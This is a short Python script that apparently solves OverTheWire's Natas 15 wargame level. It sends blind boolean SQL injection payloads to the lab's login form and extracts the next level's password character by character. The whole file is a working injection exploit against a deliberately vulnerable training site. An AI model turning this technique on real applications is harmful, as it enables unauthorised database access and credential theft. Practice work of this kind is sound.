import subprocess
import re
import requests
import string
from requests.auth import HTTPBasicAuth

passw = subprocess.run(['getpass', '15'], stdout=subprocess.PIPE).stdout.decode('utf-8')
temp_alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits

def build_alphabet(alpha):
    cused = ""
    for char in alpha:
        #print('cused: ' + cused)
        if inject_payload({'username':'natas16" and password LIKE BINARY "%' + char + '%"#'}):
            cused += char
            
    return cused

def build_payload(curr_pass):
    payload = 'natas16" and password LIKE BINARY "' + curr_pass + '%"#'
    data = {'username':payload}
    return data

def inject_payload(payload):
    r = requests.post('http://natas15.natas.labs.overthewire.org/', auth=HTTPBasicAuth('natas15', passw.strip()), data=payload);
    if not "This user doesn't exist." in r.text:
        return True
    return False

if __name__ == "__main__":
    password = "" 
    alphabet = build_alphabet(temp_alphabet)
    while len(password) != 32:
        #print('...')
        for char in alphabet:
            if inject_payload(build_payload(password+char)):
                password += char
                #print('pass: ' + password)
                break
    print(password)
